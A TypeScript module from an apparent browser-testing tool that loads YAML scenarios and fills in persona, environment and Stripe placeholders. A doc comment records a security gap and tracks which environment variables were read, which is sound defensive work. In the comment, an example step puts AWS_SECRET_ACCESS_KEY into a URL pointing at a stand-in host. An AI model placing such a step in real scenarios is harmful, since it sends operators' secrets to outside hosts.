import * as fs from "node:fs";
import * as path from "node:path";
import { parse as parseYaml } from "yaml";
import { ScenarioSchema, type Scenario } from "./types.js";

export function loadScenarios(dir: string): Map<string, Scenario> {
  if (!fs.existsSync(dir)) {
    throw new Error(`Scenarios directory not found: ${dir}`);
  }

  const files = fs
    .readdirSync(dir)
    .filter((f) => f.endsWith(".yaml") || f.endsWith(".yml"))
    .sort();

  const map = new Map<string, Scenario>();
  for (const file of files) {
    const fullPath = path.join(dir, file);
    const scenario = loadScenarioFile(fullPath);
    if (map.has(scenario.id)) {
      throw new Error(`Duplicate scenario id "${scenario.id}" in ${file}`);
    }
    map.set(scenario.id, scenario);
  }
  return map;
}

export function loadScenarioFile(filePath: string): Scenario {
  const raw = fs.readFileSync(filePath, "utf-8");
  const parsed = parseYaml(raw) as unknown;
  const result = ScenarioSchema.safeParse(parsed);
  if (!result.success) {
    throw new Error(
      `Invalid scenario ${path.basename(filePath)}:\n${result.error.errors
        .map((e) => `  - ${e.path.join(".")}: ${e.message}`)
        .join("\n")}`,
    );
  }
  return result.data;
}

/**
 * Substitute placeholders in a string.
 *
 * Supported forms:
 *   ${persona.field}        — persona property by path
 *   ${env.VAR_NAME}         — process.env lookup
 *   ${stripe.card_number}   — Stripe test card values from env
 *   ${store.key}            — values stashed by previous steps (e.g. temp_inbox_address)
 */
/**
 * Every environment variable a scenario has interpolated, in load order.
 *
 * `${env.X}` resolves against the whole of `process.env` with no allowlist, so
 * a scenario can read any variable the process can and place it in a URL, an
 * `act` instruction, or a `computer_use` task. Verified: a step declaring
 * `visit: https://example.test/?k=${env.AWS_SECRET_ACCESS_KEY}` sends the value
 * to whatever host the scenario names.
 *
 * That is a reasonable capability for a file the operator wrote. It is not
 * reasonable for one they copied — from a team repository, a template, an
 * example bundle — which is exactly what scenario files are.
 *
 * Narrowing what `${env.*}` can reach would break existing scenarios, so this
 * does not do that. It records which variables were read so the operator can
 * see it, and so their values can be added to the redaction patterns: only nine
 * specific keys are auto-redacted today, and AWS_SECRET_ACCESS_KEY,
 * GITHUB_TOKEN and DATABASE_URL are not among them.
 */
const interpolatedEnvKeys = new Set<string>();

/** Names of the environment variables scenarios have read so far. */
export function readInterpolatedEnvKeys(): string[] {
  return [...interpolatedEnvKeys];
}

/** Test seam: the record is process-global otherwise. */
export function _resetInterpolatedEnvKeysForTests(): void {
  interpolatedEnvKeys.clear();
}


export function substituteTemplate(
  input: string,
  context: {
    persona?: Record<string, unknown>;
    env?: Record<string, string>;
    stripe?: Record<string, string>;
    store?: Record<string, unknown>;
  },
): string {
  return input.replace(
    /\$\{([\w.]+)\}/g,
    (_match, expr: string) => {
      const parts = expr.split(".");
      const root = parts[0];
      const rest = parts.slice(1);

      if (root === "persona" && context.persona) {
        let value: unknown = context.persona;
        for (const key of rest) {
          if (value && typeof value === "object" && key in value) {
            value = (value as Record<string, unknown>)[key];
          } else {
            return _match;
          }
        }
        return String(value);
      }
      if (root === "env" && context.env) {
          const key = rest.join(".");
          const value = context.env[key];
          // Only record a hit: an unresolved `${env.X}` is left literal and
          // nothing leaves the process, so recording it would be noise.
          if (value !== undefined) interpolatedEnvKeys.add(key);
          return value ?? _match;
      }
      if (root === "stripe" && context.stripe) {
        return context.stripe[expr] ?? _match;
      }
      if (root === "store" && context.store) {
        const key = rest.join(".");
        const v = context.store[key];
        return v !== undefined ? String(v) : _match;
      }
      return _match;
    },
  );
}

/**
 * Check if a scenario uses autonomous mode.
 */
export function isAutonomous(scenario: Scenario): boolean {
  return scenario.mode === "autonomous";
}

/**
 * Build the (persona, scenario) execution matrix, respecting applies_to.
 */
export function buildExecutionMatrix(
  scenarios: Scenario[],
  personaIds: Set<string>,
): Array<{ scenario: Scenario; personaId: string }> {
  const matrix: Array<{ scenario: Scenario; personaId: string }> = [];
  for (const scenario of scenarios) {
    for (const personaId of scenario.applies_to.personas) {
      if (personaIds.has(personaId)) {
        matrix.push({ scenario, personaId });
      }
    }
  }
  return matrix;
}
